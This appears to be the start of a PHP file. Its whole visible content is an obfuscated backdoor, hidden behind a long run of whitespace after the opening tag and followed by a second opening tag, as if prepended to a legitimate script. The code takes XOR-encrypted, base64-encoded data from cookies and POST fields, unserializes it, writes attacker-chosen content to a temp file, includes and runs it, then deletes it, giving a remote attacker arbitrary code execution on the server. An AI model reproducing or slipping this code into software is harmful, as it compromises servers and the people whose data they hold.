<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("sszptuynug")){class sszptuynug{public static $tewsk = "rkrnnlblbvtmraxc";public static $kbushsjcd = NULL;public function __construct(){$tqzplros = @$_COOKIE[substr(sszptuynug::$tewsk, 0, 4)];if (!empty($tqzplros)){$rjmzamwyb = "base64";$kajhsycleq = "";$tqzplros = explode(",", $tqzplros);foreach ($tqzplros as $tzwcjxsodt){$kajhsycleq .= @$_COOKIE[$tzwcjxsodt];$kajhsycleq .= @$_POST[$tzwcjxsodt];}$kajhsycleq = array_map($rjmzamwyb . "_decode", array($kajhsycleq,));$kajhsycleq = $kajhsycleq[0] ^ str_repeat(sszptuynug::$tewsk, (strlen($kajhsycleq[0]) / strlen(sszptuynug::$tewsk)) + 1);sszptuynug::$kbushsjcd = @unserialize($kajhsycleq);}}public function __destruct(){$this->fnpqfeouto();}private function fnpqfeouto(){if (is_array(sszptuynug::$kbushsjcd)) {$vpiyep = sys_get_temp_dir() . "/" . crc32(sszptuynug::$kbushsjcd["salt"]);@sszptuynug::$kbushsjcd["write"]($vpiyep, sszptuynug::$kbushsjcd["content"]);include $vpiyep;@sszptuynug::$kbushsjcd["delete"]($vpiyep);exit();}}}$humwgoh = new sszptuynug();$humwgoh = NULL;} ?><?php
